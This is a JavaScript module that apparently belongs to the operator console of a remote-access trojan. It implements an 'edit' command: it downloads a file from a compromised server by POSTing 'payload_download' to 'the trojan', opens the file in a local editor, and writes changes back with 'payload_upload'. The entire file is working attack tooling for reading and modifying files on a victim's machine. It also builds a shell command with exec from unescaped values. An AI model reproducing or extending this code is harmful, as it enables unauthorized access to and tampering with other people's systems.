const errors     = require('./util-http-error');
const exec       = require('child_process').exec;
const fs         = require('fs');
const md5        = require('md5-file');
const mime       = require('mime-types');
const path       = require('path');
const shellwords = require('shellwords');
const tmp        = require('tmp');

module.exports = function(config, req, cmd, callback) {

  // tokenize the input string
  const tokenized = shellwords.split(cmd);
  const src       = tokenized[1] || '';

  // Generate a temporary file with an extension that mathces the source file.
  // The matching extension is important to allow editors to choose the
  // appropriate syntax-highlighting automatically.
  const dst = tmp.fileSync({ postfix: path.extname(src) }).name;

  // assert that src was provided
  if (! src) {

    // assemble an error message
    var err = [
      'Specify a file to edit.',
      'Usage: edit <remote-filename>'
    ].join('\n');

    return callback(new Error(err));
  }
  
  // initialize the POST body
  const body = {
    cmd : 'payload_download',
    args : {
      file : src,
    },
  };

  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {

    if (err) {
      return callback(err);
    }

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    // convert the base64-encoded response to binary
    const data = new Buffer(response.stdout, 'base64');

    // write the downloaded file to the local filesystem
    fs.writeFile(dst, data, function(err) {

      if (err) {
        response.stderr.push(err);
      }

      // calculate the md5 hash of the downloaded file
      const hashBefore = md5.sync(dst);

      // determine the appropriate application for editing the file
      const mimetype = mime.lookup(path.extname(dst));
      const editor   = config.global.editors[mimetype] || config.global.editors.default;

      // open the application
      exec(editor + ' ' + dst, function(err, stdout, stderr) {

        if (err) {
          return callback(err);
        }
        
        // calculate the md5 hash of the file after editing
        const hashAfter = md5.sync(dst);

        // If the "before" and "after" hashes match, the file wasn't changed.
        // Thus, we won't bother to upload it to the remote server.
        if (hashBefore === hashAfter) {
          response.stdout = [ 'File unchanged. Edit cancelled.' ];
          return callback(null, response);
        }

        // Otherwise, the file *has* been edited, so we want to update the file
        // on the remote server as well.

        // read the file data
        const data = new Buffer(fs.readFileSync(dst)).toString('base64');

        // initialize the POST body
        const uploadBody = {
          cmd : 'payload_upload',
          args : {
            dst  : src,
            data : data,
          },
        };

        // POST to the trojan
        req.post({ body : uploadBody }, function(err, obj, response) {

          if (obj.statusCode !== 200) {
            return callback(errors(config, obj.statusCode));
          }

          callback(err, response);
        });
      });
    });
  });
};
